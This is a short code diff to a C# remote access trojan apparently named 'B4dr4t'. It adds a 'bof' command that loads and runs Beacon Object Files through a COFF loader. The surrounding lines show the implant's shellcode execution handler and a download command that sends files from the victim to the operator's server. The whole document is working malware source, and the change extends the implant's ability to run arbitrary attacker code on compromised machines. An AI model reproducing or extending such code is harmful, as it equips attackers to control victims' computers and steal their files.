@@ -563,6 +563,19 @@ namespace B4dr4t
                                         retval = "[!] Error occured running sh#llc#de: \n" + e.Message;
                                     }
                                 }
+                                else if (cmnd.Split(' ')[0] == "bof") 
+                                {
+                                    var items = cmnd.Split(' ');
+                                    const string function = "go";
+                                    string data = items[1];
+                                    string arg_data = "AAAAAA==";
+                                    if (items.Length > 2)
+                                    {
+                                        arg_data = items[2];
+                                    }
+                                    var loader = new COFFLoader.COFFLoader();
+                                    retval = loader.RunCoff(function, data, arg_data);
+                                }
                                 else if (cmnd.Split(' ')[0] == "dl")
                                 {
                                     //Download a file -- Send a file from the rat to the server
